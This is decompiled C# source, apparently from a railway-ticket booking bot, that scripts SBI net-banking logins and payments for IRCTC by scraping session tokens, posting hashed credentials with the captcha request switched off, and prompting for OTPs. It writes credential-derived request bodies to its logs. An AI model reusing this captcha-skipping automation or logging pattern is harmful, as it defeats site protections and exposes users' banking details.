using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Cache;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using System.Xml.Linq;
using Bhim;
using BhimGood;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using MReget;
using NativeCSharpJWTToken;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Ocsp;
using Org.BouncyCastle.Utilities;
using Org.BouncyCastle.Utilities.Net;
using QRCoder;
using WebSocketSharp;
using static System.Net.Mime.MediaTypeNames;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using Application = System.Windows.Forms.Application;
using ComboBox = System.Windows.Forms.ComboBox;
using Image = System.Drawing.Image;
using Strings = Microsoft.VisualBasic.Strings;

namespace IRCommDLL
{
    internal class Bank
    {
        public sealed class GClass5
        {
            public Random object_0;

            public char method_0(string A_1)
            {
                return A_1[object_0.Next(A_1.Length)];
            }
        }

        private CookieContainer cookieContainer_0;

        public static bool sbiActive;
        private string multipart = "";

        private static object object_13 = new object();

        private static object object_14 = new object();

        private static object object_16 = new object();

        private static object object_17 = new object();

        internal UpdateTStatus updateTStatus_1;

        private clsMain clsMain;

        private clsPostData class3_0;

        private WebException webException_0;

        internal WebProxy webProxy_3;

        internal Control control_0;

        internal Rectangle rectangle_0;

        private bool bool_24;

        public static bool axisbank;

        private string string_21;

        private string string_16;

        private string tCntrlName_;

        private bool bool_14;

        private bool bool_13;

        private bool bool_41;

        private bool bool_40;

        private bool bool_15;

        private string string_52;

        private bool bool_27;

        private bool bool_51;

        private bool bool_21;

        private bool bool_23;

        private bool bool_28;

        private bool bool_30;

        private bool bool_29;

        private bool Paytm_json;

        private bool bool_36;

        private bool bool_37;

        private bool bool_11;

        private bool bool_38;

        private string string_29;

        private CookieContainer cookieContainer_1;

        private WebProxy webProxy_2;

        private DateTime dateTime_1;

        private bool bool_22;

        private string string_50 = "29304E87583278923487A64389764380763087426708234658764320F8764387645678023467843678657678243678934208346543763426342087364764378623487165321780324643278643287634807347867463247864326D43204376743286743290874784C3260409A876";

        private Bitmap bitmap_0;

        private bool bool_19;

        private object httpStatusCode_0;

        private string string_69;

        private string string_71;

        private string string_68;

        private bool bool_39;

        private string errormsg;

        private static Func<char, string> func_0;

        private static Func<StringBuilder, byte, StringBuilder> func_2;

        private static Func<StringBuilder, byte, StringBuilder> func_3;

        private bool bool_52;

        private string response;

        private string responseIn;

        private string url;

        private string postdata;

        private string randomvalueb;//randomvalueb

        private int UpiTimeout = 21;

        private string Reffral;

        private WebProxy webProxy_1;

        private DateTime dateTime_4;

        private Stopwatch stopwatch_0;

        private bool bool_42;

        private string string_13;

        private string string_42;

        private string reff;

        private string string_5;
        private bool bool_3;
        private bool bool_32;
        private string string_63i;
        public long Privs_wait;

        public long Cur_wait;

        public long Avg_wait;
        private long elapsedMilliseconds;
        private bool bool_16;
        private bool bool_5;
        private bool bool_12;

        public int Int32_0 { get; private set; }

        public string String_0 { get; private set; }

        public bool Boolean_0 { get; private set; }
        internal string Cookieklist = "";

        private string Locations = "";
        private bool bool_4;
        private DateTime dateTime_0;
        private bool bool_6;

        [DllImport("kernel32.dll")]
        internal static extern void ExitProcess(uint uint_0);

        internal Bank(clsMain class28_1, clsPostData postData)
        {
            clsMain = class28_1;
            class3_0 = postData;
            tCntrlName_ = class28_1.tCntrlName_;
        }

        internal bool SbiNetBanking_Paytm(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2, ref CookieContainer cookieContainer_2)
        {
            bool result = false;
            while (sbiActive)
            {
                Application.DoEvents();
                Thread.Sleep(300);
            }
            sbiActive = true;
            string_90 = "";
            string_91 = "";
            int num = 90000;
            int num2 = -1;
            int num3 = -1;
            string text = "otpMobile";
            while (true)
            {
                clsMain.Lock("Enter ProcessSBISBINetBanking.!!!!");
                if (!string_86.Contains("onlinesbi"))
                {
                    break;
                }
                string string_93 = jsonData_Serial(string_86, "callbackUrl");
                string sbiedata = jsonData_Serial(string_86, "encdata");
                string sbimcode = jsonData_Serial(string_86, "merchant_code");
                 sbiedata = sbiedata.Replace("\\n", "\r\n");
                string text6 = "merchant_code=PAYTM_IRCOAPP&encdata=" + HttpUtility.UrlEncode(sbiedata);//aDC752sm%2Fuzb5u%2BdZBkJelNt6cTvrQBtF%2BdYrC9w985VjmTxlIJoNPoXsBwINUyLSaYCnXeqpfnd%0D%0AAvYedEkLufC4CGdqGYNE6IzVD%2FGAyODHUm2WPK00JXfpLDWpKA1nTBnn0V6pWwFCvdY5vmLTVKKI%0D%0AdutcYjxEHTWo8qwZ%2FeA%3D";
                string_90 = "";
                string string_92 = "https://secure.paytm.in/";
                string[] array = string_88.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text2 = array[0].Trim();
                string text3 = array[1];
                //string string_93 = "";
                string string_94 = "";
                if (array.Length > 2)
                {
                    array[2].Trim();
                }
                bool flag = false;
                string text4 = "./SBI";
                string text5 = "SBI_" + text2;
                string path = text4 + "\\" + text5 + ".rg";
                if (File.Exists(path))
                {
                    flag = true;
                    text = "otpOnline";
                }
                //string[] array1 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                //string text6 = array1[0];//class3_0.Method_SerialInp(string_86, ref string_93, bool_14: false);
                //text6 = text6.Replace('\n', ' ');
                //string_93 = array1[1];

                CookieContainer cookieContainer_3 = new CookieContainer();
                string string_95 = "";
                string string_96 = "";
                try
                {
                    string text7 = "";
                    string text8 = "";
                    string text9 = "";
                    string text10 = "";
                    clsMain.Lock("First Hit : Inp = " + text6);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(1/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                    {
                        string_91 = "1. SBI Http Working Failed";
                        clsMain.Lock("First Http Hit Failed. err = " + string_95);
                        cookieContainer_2 = null;
                        sbiActive = false;
                        return false;
                    }
                    clsMain.Lock("First Output Sucessfull htm = " + string_96);
                    if (!string_96.Contains("username"))
                    {
                        sbiActive = false;
                        return result;
                    }
                    string_92 = string_93;
                    string text11 = "";
                    if (string_96.IndexOf(";jsessionid=") > 0)
                    {
                        text11 = string_96.Substring(string_96.IndexOf(";jsessionid="));
                        text11 = text11.Substring(0, text11.IndexOf("'"));
                    }
                    string_93 = "https://merchant.onlinesbi.sbi/merchant/loginsubmit.htm;" + text11;
                    string text12 = "";
                    string text13 = "";
                    int num4 = string_96.IndexOf("name=\"keyString");
                    if (num4 > 0)
                    {
                        num4 = string_96.IndexOf("lue=\"", num4) + 5;
                        int length = string_96.IndexOf("\"", num4) - num4;
                        text12 = string_96.Substring(num4, length);
                    }
                    num4 = string_96.IndexOf("name=\"__ncforminfo");
                    if (num4 > 0)
                    {
                        num4 = string_96.IndexOf("lue=\"", num4) + 5;
                        int length2 = string_96.IndexOf("\"", num4) - num4;
                        text13 = string_96.Substring(num4, length2);
                    }
                    string text14 = "Dummy@123";
                    string text15 = "Dummy@123";
                    text14 = Class12.smethod_9(Class12.smethod_9(text2 + "#" + text14) + "#" + text12);
                    text15 = Class12.smethod_9(Class12.smethod_9(text2 + "#" + text15) + "#" + text12);
                    string string_97 = Class12.smethod_10(Class12.smethod_10(text2 + "#" + text3) + "#" + text12);
                    Class12.smethod_9(text2 + "#" + text3);
                    string string_98 = Class12.smethod_9(text2 + "#" + text3);
                    string string_99 = Class12.smethod_9(Class12.smethod_9(text2 + "#" + text3) + "#" + text12);
                    string string_100 = "retail";
                    text6 = class3_0.Method_SerialInp(string_96, ref string_94, bool_14: false).Replace("&loginmode=corporate", "").Replace("&optionOfCaptcha=AUD", "");
                    text6 = clsPostData.SetPost(text6, "userName", text2);
                    text6 = clsPostData.SetPost(text6, "password", string_97);
                    text6 = clsPostData.SetPost(text6, "sha2password", string_99);
                    text6 = clsPostData.SetPost(text6, "loginmode", string_100);
                    text6 = clsPostData.SetPost(text6, "password0", text14);
                    text6 = clsPostData.SetPost(text6, "password1", text14);
                    text6 = clsPostData.SetPost(text6, "cmpPassword", string_98);
                    text6 = clsPostData.SetPost(text6, "LoginCaptchaReq", "NO");
                    text6 = text6.Replace("&keyString", "");
                    text6 = text6.Replace("& type==", "");
                    text6 = text6 + "&__ncforminfo=" + text13;
                    clsMain.Lock("Second Hit : Inp = " + text6);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(2/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                    {
                        clsMain.Lock("Second Hit Failed. err = " + string_95);
                        string_91 = "Failed while making Payment. Payment Not Done";
                        sbiActive = false;
                        return false;
                    }
                    clsMain.Lock("Second Hit Output = " + string_96);
                    text11 = "";
                    string_92 = string_93;
                    if (!string_96.Contains("Welcome"))
                    {
                        clsMain.Lock("Second Hit, Not valid HTML err = " + string_91);
                        string_91 = "Invaild Bank's Details";
                        cookieContainer_2 = null;
                        sbiActive = false;
                        return false;
                    }
                    if (string_96.Contains("You already have an active session"))
                    {
                        clsMain.Lock("Second Hit, Not valid HTML err = " + string_91);
                        string_91 = "You already have an active session";
                        cookieContainer_2 = null;
                        sbiActive = false;
                        return false;
                    }
                    while (true)
                    {
                        num3++;
                        if (string_96.IndexOf(";jsessionid=") > 0)
                        {
                            text11 = string_96.Substring(string_96.IndexOf(";jsessionid="));
                            text11 = text11.Substring(0, text11.IndexOf("\""));
                        }
                        num4 = string_96.IndexOf("selectAccountNo");
                        if (num4 > 0)
                        {
                            num4 = string_96.IndexOf("(", num4) + 1;
                            int length3 = string_96.IndexOf(");", num4) - num4;
                            text12 = string_96.Substring(num4, length3).Replace("'", "");
                            string[] array2 = text12.Split(',');
                            if (array2.Length >= 3)
                            {
                                text7 = array2[1];
                                text9 = array2[2];
                                text8 = array2[3];
                            }
                            else
                            {
                                num4 = string_96.IndexOf("debit_accountNo");
                                num4 = string_96.IndexOf("lue=\"", num4) + 5;
                                length3 = string_96.IndexOf("\"", num4) - num4;
                                text7 = string_96.Substring(num4, length3);
                                num4 = string_96.IndexOf("debit_branchCode");
                                num4 = string_96.IndexOf("lue=\"", num4) + 5;
                                length3 = string_96.IndexOf("\"", num4) - num4;
                                text8 = string_96.Substring(num4, length3);
                                num4 = string_96.IndexOf("selectedNickName");
                                num4 = string_96.IndexOf("lue=\"", num4) + 5;
                                length3 = string_96.IndexOf("\"", num4) - num4;
                                text9 = string_96.Substring(num4, length3);
                            }
                        }
                        num4 = string_96.IndexOf("setBankSystem");
                        string text16 = "";
                        string text17 = "";
                        if (num4 > 0)
                        {
                            num4 = string_96.IndexOf("(", num4) + 1;
                            int length4 = string_96.IndexOf(");", num4) - num4;
                            text12 = string_96.Substring(num4, length4).Replace("'", "");
                            string[] array3 = text12.Split(',');
                            if (array3.Length > 1)
                            {
                                text16 = array3[0];
                                text17 = array3[1];
                            }
                        }
                        num4 = string_96.IndexOf("name=\"corpMode");
                        if (num4 > 0)
                        {
                            num4 = string_96.IndexOf("lue=", num4) + 4;
                            int length5 = string_96.IndexOf(">", num4) - num4;
                            text10 = string_96.Substring(num4, length5).Replace("'", "").Replace("\"", "")
                                .Trim();
                        }
                        text6 = "debitAccountNo=" + text7 + "&debitAccountType=" + text9 + "&debitBranchCode=" + text8 + "&corpMode=" + text10 + "&dproductDisc=" + text16 + "&dbankSystem=" + text17 + "&vechequeNo=&d=radiobutton&statusCount=1&debit_accountNo=" + text7 + "&debit_branchCode=" + text8 + "&selectedNickName=" + text9 + "&vechequeNo=&validation=--%7CRemarks%7C%7C1%7C&--=Railway+Ticket+Booking&SecurityId=CRIS&RU=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&merchstatus=1&amountinwords=&txnPassword=&Submit=Confirm";
                        text6 = class3_0.Method_SerialInp(string_96, ref string_94, bool_14: false).Replace("&Cancel=Reset", "");
                        string_93 = "https://merchant.onlinesbi.sbi/merchant/merchantinter.htm;" + text11;
                        text6 = clsPostData.SetPost(text6, "debitAccountNo", text7);
                        text6 = clsPostData.SetPost(text6, "debitAccountType", text9);
                        text6 = clsPostData.SetPost(text6, "debitBranchCode", text8);
                        text6 = clsPostData.SetPost(text6, "corpMode", text10);
                        text6 = clsPostData.SetPost(text6, "dproductDisc", text16);
                        text6 = clsPostData.SetPost(text6, "dbankSystem", text17);
                        clsMain.Lock("Third Hit Inp = " + text6);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(3/6)", tCntrlName_, null, null);
                        }
                        if (_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Output = " + string_96);
                            string_92 = string_93;
                            string frmMerchantPostt = string_96.Substring(string_96.IndexOf("fnPreconfirmdisable") + 21);
                            frmMerchantPostt = frmMerchantPostt.Substring(0, frmMerchantPostt.IndexOf("')"));
                            if (string_96.Contains("Enter high security transaction password received in your mobile phone "))
                            {
                                string_92 = string_93;
                                if (!string_96.Contains("you will be automatically redirected to the"))
                                {
                                   
                                    while (string_96.Contains("Enter high security transaction password received in your mobile phone "))
                                    {
                                        flag = false;
                                        clsMain.Lock("After Fourth Hit Loading for OTP :" + text);
                                        string text18 = "";
                                        if (!flag)
                                        {
                                            frmOTP frmOTP = new frmOTP();
                                            frmOTP.method_1SBINB_APP(clsMain.control_0, clsMain.rectangle_0, bool_2: true, "SBI OTP", "SBI_" + array[2]);
                                            if (frmOTP.DialogResult != DialogResult.OK)
                                            {
                                                clsMain.Lock("OTP Cancel");
                                                string_91 = "OTP Cancelled By User";
                                                updateTStatus_1.BeginInvoke(2, "OTP Cancelled By User", tCntrlName_, null, null);
                                                sbiActive = false;
                                                return false;
                                            }
                                            text18 = frmOTP.string_0;
                                            frmOTP.Dispose();
                                        }
                                        text18 = EncryptAes(text18, frmMerchantPostt);
                                        text18 = HttpUtility.UrlEncode(text18);
                                        if (text18.Length >= 2)
                                        {
                                            string_92 = string_93;
                                            if (string_96.IndexOf(";jsessionid=") > 0)
                                            {
                                                text11 = string_96.Substring(string_96.IndexOf(";jsessionid="));
                                                text11 = text11.Substring(0, text11.IndexOf("\""));
                                            }
                                            text6 = class3_0.Method_SerialInp(string_96, ref string_94, bool_14: false);
                                            string_93 = "https://merchant.onlinesbi.sbi/merchant/smsenablehighsecurityconfirm.htm;" + text11;
                                            text6 = text6.Replace("&Button4=Confirm", "").Replace("&Reset=Reset", "");
                                            text6 = clsPostData.SetPost(text6, "securityPassword", text18);
                                            clsMain.Lock("Hit Fifith + High Security Hit Inp = " + text6);
                                            if (updateTStatus_1 != null)
                                            {
                                                updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(5/6)", tCntrlName_, null, null);
                                            }
                                            if (!_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                                            {
                                                goto IL_105c;
                                            }
                                            clsMain.Lock("Hit Fifith + High Security Hit output = " + string_96);
                                            string_92 = string_93;
                                            if (string_96.Contains("you will be automatically redirected to the"))
                                            {
                                                goto IL_10ac;
                                            }
                                            if (string_96.Contains("High security transaction password"))
                                            {
                                                num2++;
                                                if (num2 >= 3)
                                                {
                                                    break;
                                                }
                                                if (num2 == 0)
                                                {
                                                    continue;
                                                }
                                                goto IL_1107;
                                            }
                                            if (num3 < 3)
                                            {
                                                goto end_IL_064f;
                                            }
                                            break;
                                        }
                                        clsMain.Lock("OTP Not Recived Cancelled by App.");
                                        string_91 = "SBI OTP Cancelled by User";
                                        sbiActive = false;
                                        return false;
                                    }
                                }
                                goto IL_1350;
                            }
                            string_91 = "You have exceeded the per day transaction maximum count";
                            clsMain.Lock("Third Hit Failed, Not valid HTML err = " + string_91);
                            sbiActive = false;
                            return false;
                        }
                        clsMain.Lock("Third Hit Failed. err = " + string_95);
                        string_91 = "Failed while making Payment. Payment Not Done";
                        sbiActive = false;
                        return false;
                    IL_105c:
                        string_91 = "Failed while making Payment. Payment Not Done";
                        if (num3 < 3)
                        {
                            goto IL_1147;
                        }
                        clsMain.Lock("Fifth + High Security Hit Failed. err = " + string_95);
                        sbiActive = false;
                        return false;
                    IL_1350:
                        if (string_96.Contains("you will be automatically redirected to the"))
                        {
                            if (string_96.Contains("Completed Successfully"))
                            {
                                if (string_96.IndexOf(";jsessionid=") > 0)
                                {
                                    text11 = string_96.Substring(string_96.IndexOf(";jsessionid="));
                                    text11 = text11.Substring(0, text11.IndexOf("'"));
                                }
                                text6 = class3_0.Method_SerialInp(string_96, ref string_94, bool_14: false);
                                clsMain.Lock("Sixth Hit Inp = " + text6);
                                string_93 = "https://merchant.onlinesbi.sbi/merchant/redirect.htm;" + text11;
                                if (updateTStatus_1 != null)
                                {
                                    updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(6/6)", clsMain.tCntrlName_, null, null);
                                }
                                if (!_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                                {
                                    clsMain.Lock("Sixth Hit Failed. err = " + string_95);
                                    string_91 = "Failed while making Payment. Payment Not Done";
                                    sbiActive = false;
                                    return false;
                                }
                                clsMain.Lock("Sixth Hit Output = " + string_96);
                                if (string_96.Contains("document.redirectForm.submit"))
                                {
                                    string_90 = string_96;
                                    string_91 = string_93;
                                    sbiActive = false;
                                    return true;
                                }
                                string_91 = "Failed! Payment Done, Ticket Not Booked";
                                clsMain.Lock("Fifth Hit Failed, Not valid HTML err = " + string_91);
                                sbiActive = false;
                                return false;
                            }
                            if (string_96.Contains("Clear Balance Funds not available") | string_96.Contains("Insufficient funds"))
                            {
                                string_91 = "Clear Balance Funds not available into SBI, Ticket Not Booked";
                            }
                            else if (string_96.Contains("failure"))
                            {
                                string_91 = " Failure Transaction into SBI, Ticket Not Booked";
                                if (num3 < 2)
                                {
                                    break;
                                }
                            }
                            else if (num3 < 2)
                            {
                                break;
                            }
                        }
                        clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_91);
                        sbiActive = false;
                        return false;
                    IL_1147:
                        string_93 = "https://merchant.onlinesbi.sbi/merchant/merchantdisplay.htm";
                        text6 = "";
                        clsMain.Lock("Second-Second Hit Inp = " + text6);
                        if (_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Second-Second Hit Output = " + string_96);
                            string_92 = string_93;
                            continue;
                        }
                        clsMain.Lock("Second-Second Hit Failed. err = " + string_95);
                        string_91 = "Failed while making Payment. Payment Not Done";
                        sbiActive = false;
                        return false;
                    IL_1107:
                        if (num2 == 1 && text == "otpOffline")
                        {
                            goto IL_1147;
                        }
                        clsMain.Lock("After Fifth + High Security Hit Failed. err = Invaild Bank Bypass Detail");
                        string_91 = "Invaild Bank Bypass Detail. Please Again Bypass it";
                        sbiActive = false;
                        return false;
                    IL_10ac:
                        if (string_96.Contains("Sorry, unable to process your request. Please try later.") && num3 < 3)
                        {
                            goto IL_1147;
                        }
                        goto IL_1350;
                        continue;
                    end_IL_064f:
                        break;
                    }
                }
                catch
                {
                    sbiActive = false;
                    return false;
                }
            }
            string_91 = "0.Some Thing Went Wrong With SBI Payment";
            clsMain.Lock("0.Html Doesn't Contains Onlinesbi, Returning.");
            sbiActive = false;
            return false;
        }

        internal bool SbiNetBanking(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2, ref CookieContainer cookieContainer_2)
        {
            bool result = false;
            while (sbiActive)
            {
                Application.DoEvents();
                Thread.Sleep(300);
            }
            sbiActive = true;
            string_90 = "";
            string_91 = "";
            int num = 90000;
            int num2 = -1;
            int num3 = -1;
            string text = "otpMobile";
            while (true)
            {
                clsMain.Lock("Enter ProcessSBISBINetBanking.!!!!");
                if (!string_86.Contains("onlinesbi"))
                {
                    break;
                }
                string_90 = "";
                string string_92 = "https://www.irctc.co.in/eticketing/jpInput.jsf?cid=1";
                string[] array = string_88.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text2 = array[0].Trim();
                string text3 = array[1];
                string string_93 = "";
                string string_94 = "";
                if (array.Length > 2)
                {
                    array[2].Trim();
                }
                bool flag = false;
                string text4 = "./SBI";
                string text5 = "SBI_" + text2;
                string path = text4 + "\\" + text5 + ".rg";
                if (File.Exists(path))
                {
                    flag = true;
                    text = "otpOnline";
                }
                string text6 = class3_0.Method_SerialInp(string_86, ref string_93, bool_14: false);
                CookieContainer cookieContainer_3 = new CookieContainer();
                string string_95 = "";
                string string_96 = "";
                try
                {
                    string text7 = "";
                    string text8 = "";
                    string text9 = "";
                    string text10 = "";
                    clsMain.Lock("First Hit : Inp = " + text6);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(1/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                    {
                        string_91 = "1. SBI Http Working Failed";
                        clsMain.Lock("First Http Hit Failed. err = " + string_95);
                        cookieContainer_2 = null;
                        return false;
                    }
                    clsMain.Lock("First Output Sucessfull htm = " + string_96);
                    if (!string_96.Contains("username"))
                    {
                        return result;
                    }
                    string_92 = string_93;
                    string text11 = "";
                    if (string_96.IndexOf(";jsessionid=") > 0)
                    {
                        text11 = string_96.Substring(string_96.IndexOf(";jsessionid="));
                        text11 = text11.Substring(0, text11.IndexOf("'"));
                    }
                    string_93 = "https://merchant.onlinesbi.sbi/merchant/loginsubmit.htm;" + text11;
                    string text12 = "";
                    string text13 = "";
                    int num4 = string_96.IndexOf("name=\"keyString");
                    if (num4 > 0)
                    {
                        num4 = string_96.IndexOf("lue=\"", num4) + 5;
                        int length = string_96.IndexOf("\"", num4) - num4;
                        text12 = string_96.Substring(num4, length);
                    }
                    num4 = string_96.IndexOf("name=\"__ncforminfo");
                    if (num4 > 0)
                    {
                        num4 = string_96.IndexOf("lue=\"", num4) + 5;
                        int length2 = string_96.IndexOf("\"", num4) - num4;
                        text13 = string_96.Substring(num4, length2);
                    }
                    string text14 = "Dummy@123";
                    string text15 = "Dummy@123";
                    text14 = Class12.smethod_9(Class12.smethod_9(text2 + "#" + text14) + "#" + text12);
                    text15 = Class12.smethod_9(Class12.smethod_9(text2 + "#" + text15) + "#" + text12);
                    string string_97 = Class12.smethod_10(Class12.smethod_10(text2 + "#" + text3) + "#" + text12);
                    Class12.smethod_9(text2 + "#" + text3);
                    string string_98 = Class12.smethod_9(text2 + "#" + text3);
                    string string_99 = Class12.smethod_9(Class12.smethod_9(text2 + "#" + text3) + "#" + text12);
                    string string_100 = "retail";
                    text6 = class3_0.Method_SerialInp(string_96, ref string_94, bool_14: false).Replace("&loginmode=corporate", "").Replace("&optionOfCaptcha=AUD", "");
                    text6 = clsPostData.SetPost(text6, "userName", text2);
                    text6 = clsPostData.SetPost(text6, "password", string_97);
                    text6 = clsPostData.SetPost(text6, "sha2password", string_99);
                    text6 = clsPostData.SetPost(text6, "loginmode", string_100);
                    text6 = clsPostData.SetPost(text6, "password0", text14);
                    text6 = clsPostData.SetPost(text6, "password1", text14);
                    text6 = clsPostData.SetPost(text6, "cmpPassword", string_98);
                    text6 = clsPostData.SetPost(text6, "LoginCaptchaReq", "NO");
                    text6 = text6.Replace("&keyString", "");
                    text6 = text6.Replace("& type==", "");
                    text6 = text6 + "&__ncforminfo=" + text13;
                    clsMain.Lock("Second Hit : Inp = " + text6);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(2/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                    {
                        clsMain.Lock("Second Hit Failed. err = " + string_95);
                        string_91 = "Failed while making Payment. Payment Not Done";
                        sbiActive = false;
                        return false;
                    }
                    clsMain.Lock("Second Hit Output = " + string_96);
                    text11 = "";
                    string_92 = string_93;
                    if (!string_96.Contains("Welcome"))
                    {
                        clsMain.Lock("Second Hit, Not valid HTML err = " + string_91);
                        string_91 = "Invaild Bank's Details";
                        cookieContainer_2 = null;
                        sbiActive = false;
                        return false;
                    }
                    if (string_96.Contains("You already have an active session"))
                    {
                        clsMain.Lock("Second Hit, Not valid HTML err = " + string_91);
                        string_91 = "You already have an active session";
                        cookieContainer_2 = null;
                        sbiActive = false;
                        return false;
                    }
                    while (true)
                    {
                        num3++;
                        if (string_96.IndexOf(";jsessionid=") > 0)
                        {
                            text11 = string_96.Substring(string_96.IndexOf(";jsessionid="));
                            text11 = text11.Substring(0, text11.IndexOf("\""));
                        }
                        num4 = string_96.IndexOf("selectAccountNo");
                        if (num4 > 0)
                        {
                            num4 = string_96.IndexOf("(", num4) + 1;
                            int length3 = string_96.IndexOf(");", num4) - num4;
                            text12 = string_96.Substring(num4, length3).Replace("'", "");
                            string[] array2 = text12.Split(',');
                            if (array2.Length >= 3)
                            {
                                text7 = array2[1];
                                text9 = array2[2];
                                text8 = array2[3];
                            }
                            else
                            {
                                num4 = string_96.IndexOf("debit_accountNo");
                                num4 = string_96.IndexOf("lue=\"", num4) + 5;
                                length3 = string_96.IndexOf("\"", num4) - num4;
                                text7 = string_96.Substring(num4, length3);
                                num4 = string_96.IndexOf("debit_branchCode");
                                num4 = string_96.IndexOf("lue=\"", num4) + 5;
                                length3 = string_96.IndexOf("\"", num4) - num4;
                                text8 = string_96.Substring(num4, length3);
                                num4 = string_96.IndexOf("selectedNickName");
                                num4 = string_96.IndexOf("lue=\"", num4) + 5;
                                length3 = string_96.IndexOf("\"", num4) - num4;
                                text9 = string_96.Substring(num4, length3);
                            }
                        }
                        num4 = string_96.IndexOf("setBankSystem");
                        string text16 = "";
                        string text17 = "";
                        if (num4 > 0)
                        {
                            num4 = string_96.IndexOf("(", num4) + 1;
                            int length4 = string_96.IndexOf(");", num4) - num4;
                            text12 = string_96.Substring(num4, length4).Replace("'", "");
                            string[] array3 = text12.Split(',');
                            if (array3.Length > 1)
                            {
                                text16 = array3[0];
                                text17 = array3[1];
                            }
                        }
                        num4 = string_96.IndexOf("name=\"corpMode");
                        if (num4 > 0)
                        {
                            num4 = string_96.IndexOf("lue=", num4) + 4;
                            int length5 = string_96.IndexOf(">", num4) - num4;
                            text10 = string_96.Substring(num4, length5).Replace("'", "").Replace("\"", "")
                                .Trim();
                        }
                        text6 = "debitAccountNo=" + text7 + "&debitAccountType=" + text9 + "&debitBranchCode=" + text8 + "&corpMode=" + text10 + "&dproductDisc=" + text16 + "&dbankSystem=" + text17 + "&vechequeNo=&d=radiobutton&statusCount=1&debit_accountNo=" + text7 + "&debit_branchCode=" + text8 + "&selectedNickName=" + text9 + "&vechequeNo=&validation=--%7CRemarks%7C%7C1%7C&--=Railway+Ticket+Booking&SecurityId=CRIS&RU=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&merchstatus=1&amountinwords=&txnPassword=&Submit=Confirm";
                        text6 = class3_0.Method_SerialInp(string_96, ref string_94, bool_14: false).Replace("&Cancel=Reset", "");
                        string_93 = "https://merchant.onlinesbi.sbi/merchant/merchantinter.htm;" + text11;
                        text6 = clsPostData.SetPost(text6, "debitAccountNo", text7);
                        text6 = clsPostData.SetPost(text6, "debitAccountType", text9);
                        text6 = clsPostData.SetPost(text6, "debitBranchCode", text8);
                        text6 = clsPostData.SetPost(text6, "corpMode", text10);
                        text6 = clsPostData.SetPost(text6, "dproductDisc", text16);
                        text6 = clsPostData.SetPost(text6, "dbankSystem", text17);
                        clsMain.Lock("Third Hit Inp = " + text6);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(3/6)", tCntrlName_, null, null);
                        }
                        if (_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Output = " + string_96);
                            string_92 = string_93;
                            string frmMerchantPostt = string_96.Substring(string_96.IndexOf("fnPreconfirmdisable") + 21);
                            frmMerchantPostt = frmMerchantPostt.Substring(0, frmMerchantPostt.IndexOf("')"));
                            if (string_96.Contains("Enter high security transaction password received in your mobile phone "))
                            {
                                string_92 = string_93;
                                if (!string_96.Contains("you will be automatically redirected to the"))
                                {

                                    while (string_96.Contains("Enter high security transaction password received in your mobile phone "))
                                    {
                                        flag = false;
                                        clsMain.Lock("After Fourth Hit Loading for OTP :" + text);
                                        string text18 = "";
                                        if (!flag)
                                        {
                                            frmOTP frmOTP = new frmOTP();
                                            frmOTP.method_1SBINB(clsMain.control_0, clsMain.rectangle_0, bool_2: true, "SBI OTP", "SBI_" + array[2]);
                                            if (frmOTP.DialogResult != DialogResult.OK)
                                            {
                                                clsMain.Lock("OTP Cancel");
                                                string_91 = "OTP Cancelled By User";
                                                updateTStatus_1.BeginInvoke(2, "OTP Cancelled By User", tCntrlName_, null, null);
